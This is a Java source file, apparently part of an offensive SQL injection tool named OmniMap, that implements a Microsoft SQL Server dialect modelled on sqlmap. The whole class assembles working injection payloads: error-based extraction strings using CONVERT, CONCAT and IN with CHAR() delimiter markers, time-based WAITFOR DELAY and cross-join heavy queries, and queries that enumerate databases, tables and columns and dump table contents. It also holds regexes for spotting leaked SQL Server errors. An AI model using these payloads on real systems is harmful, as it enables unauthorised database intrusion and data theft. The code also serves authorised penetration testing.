package com.omnistrike.modules.exploit.omnimap.dbms;

import java.util.List;
import java.util.concurrent.ThreadLocalRandom;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * Microsoft SQL Server dialect for OmniMap.
 * Uses INFORMATION_SCHEMA, SUBSTRING(), CHAR(), WAITFOR DELAY, IIF/CASE,
 * and CONVERT type-conversion errors for error-based extraction.
 */
public class MssqlDialect implements DbmsDialect {

    /** Random markers for error-based extraction (like sqlmap's kb.chars.start/stop) */
    private final String errorPrefixDecoded;
    private final String errorSuffixDecoded;
    private final int errorRandNum;

    public MssqlDialect() {
        this.errorPrefixDecoded = randomMarker(4);
        this.errorSuffixDecoded = randomMarker(5);
        this.errorRandNum = ThreadLocalRandom.current().nextInt(1000, 10000);
    }

    @Override
    public String getErrorPrefixDecoded() { return errorPrefixDecoded; }

    @Override
    public String getErrorSuffixDecoded() { return errorSuffixDecoded; }

    private static String randomMarker(int length) {
        ThreadLocalRandom rng = ThreadLocalRandom.current();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append((char) rng.nextInt(0x71, 0x79));
        }
        return sb.toString();
    }

    /**
     * Convert a marker string to CHAR(n)+CHAR(n)+... format.
     * Markers built from CHAR() calls only appear in error output, not reflected SQL.
     */
    private static String toCharConcat(String s) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            if (i > 0) sb.append("+");
            sb.append("CHAR(").append((int) s.charAt(i)).append(")");
        }
        return sb.toString();
    }

    @Override
    public String getName() { return "MSSQL"; }

    @Override
    public String currentDatabase() {
        return "SELECT DB_NAME()";
    }

    @Override
    public String listDatabases() {
        return "SELECT name FROM master.dbo.sysdatabases";
    }

    @Override
    public String listTables(String database) {
        return "SELECT table_name FROM " + database + ".INFORMATION_SCHEMA.TABLES WHERE table_type='BASE TABLE'";
    }

    @Override
    public String listColumns(String database, String table) {
        return "SELECT column_name FROM " + database + ".INFORMATION_SCHEMA.COLUMNS WHERE table_name='" + table + "'";
    }

    @Override
    public String dumpData(String database, String table, List<String> columns, int offset, int limit) {
        String cols = columns.stream()
                .map(c -> "ISNULL(CAST([" + c + "] AS NVARCHAR(MAX)),CHAR(32))")
                .collect(Collectors.joining("+CHAR(124)+"));
        return "SELECT TOP " + limit + " " + cols + " FROM [" + database + "].dbo.[" + table
                + "] WHERE " + cols + " NOT IN (SELECT TOP " + offset + " " + cols
                + " FROM [" + database + "].dbo.[" + table + "])";
    }

    @Override
    public String charFunction(int ascii) {
        return "CHAR(" + ascii + ")";
    }

    @Override
    public String substringFunction(String expr, int pos, int len) {
        return "SUBSTRING((" + expr + ")," + pos + "," + len + ")";
    }

    @Override
    public String lengthFunction(String expr) {
        return "LEN((" + expr + "))";
    }

    @Override
    public String sleepFunction(int seconds) {
        return "WAITFOR DELAY '0:0:" + seconds + "'";
    }

    @Override
    public String ifFunction(String condition, String trueVal, String falseVal) {
        return "IIF(" + condition + "," + trueVal + "," + falseVal + ")";
    }

    @Override
    public String commentSuffix() {
        return "--";
    }

    @Override
    public String concatenate(String... parts) {
        return String.join("+", parts);
    }

    @Override
    public List<String> errorFunctions() {
        // sqlmap MSSQL error functions with CHAR() delimiter markers.
        // CHAR() calls ensure markers only appear in error output, not reflected SQL.
        String pChar = toCharConcat(errorPrefixDecoded);
        String sChar = toCharConcat(errorSuffixDecoded);
        return List.of(
                // Level 1 (#21): IN (SELECT) â€” exact sqlmap format
                errorRandNum + " IN (SELECT (" + pChar + "+(%s)+" + sChar + "))",
                // Level 2 (#23): CONVERT with delimiters
                errorRandNum + "=CONVERT(INT,(SELECT " + pChar + "+(%s)+" + sChar + "))",
                // Level 2 (#25): CONCAT with delimiters (SQL Server 2012+)
                errorRandNum + "=CONCAT(" + pChar + ",(%s)," + sChar + ")"
        );
    }

    @Override
    public List<String> errorFunctionsForLevel(int level) {
        List<String> all = errorFunctions();
        // sqlmap: L1=IN, L2=+CONVERT+CONCAT
        if (level >= 2) return all;
        return all.subList(0, 1); // Level 1: IN only
    }

    @Override
    public String heavyQuery(int seconds) {
        // sqlmap always uses 7 cross-joined sysusers tables for MSSQL heavy queries
        return "(SELECT COUNT(*) FROM sysusers AS t1,sysusers AS t2,sysusers AS t3,sysusers AS t4,sysusers AS t5,sysusers AS t6,sysusers AS t7)";
    }

    @Override
    public List<Pattern> errorPatterns() {
        return List.of(
                // Driver / connection
                Pattern.compile("Microsoft SQL Native Client", Pattern.CASE_INSENSITIVE),
                Pattern.compile("\\bODBC SQL Server Driver\\b", Pattern.CASE_INSENSITIVE),
                Pattern.compile("\\bSQLServer\\b", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Microsoft OLE DB Provider for SQL Server", Pattern.CASE_INSENSITIVE),
                Pattern.compile("System\\.Data\\.SqlClient", Pattern.CASE_INSENSITIVE),
                Pattern.compile("com\\.microsoft\\.sqlserver\\.jdbc", Pattern.CASE_INSENSITIVE),
                // Syntax errors
                Pattern.compile("Unclosed quotation mark after the character string", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Incorrect syntax near", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Must declare the (scalar|table) variable", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Invalid column name", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Invalid object name", Pattern.CASE_INSENSITIVE),
                // Conversion errors (used for error-based extraction)
                Pattern.compile("Conversion failed when converting", Pattern.CASE_INSENSITIVE),
                Pattern.compile("converting the \\w+ value '.*' to", Pattern.CASE_INSENSITIVE),
                Pattern.compile("nvarchar value '.*' to.*int", Pattern.CASE_INSENSITIVE),
                // Divide by zero
                Pattern.compile("Divide by zero", Pattern.CASE_INSENSITIVE)
        );
    }

    @Override
    public String countRows(String database, String table) {
        return "SELECT COUNT(*) FROM [" + database + "].dbo.[" + table + "]";
    }

    @Override
    public String limitOffset(String query, int limit, int offset) {
        // MSSQL 2012+: OFFSET FETCH requires ORDER BY
        return query + " ORDER BY 1 OFFSET " + offset + " ROWS FETCH NEXT " + limit + " ROWS ONLY";
    }
}
